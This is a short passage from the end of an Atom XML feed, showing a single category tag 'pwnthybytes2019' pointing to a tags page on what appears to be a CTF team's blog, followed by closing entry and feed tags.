      <category term="pwnthybytes2019" scheme="https://teamrocketist.github.io/tags/pwnthybytes2019/"/>
    
  </entry>
  
</feed>
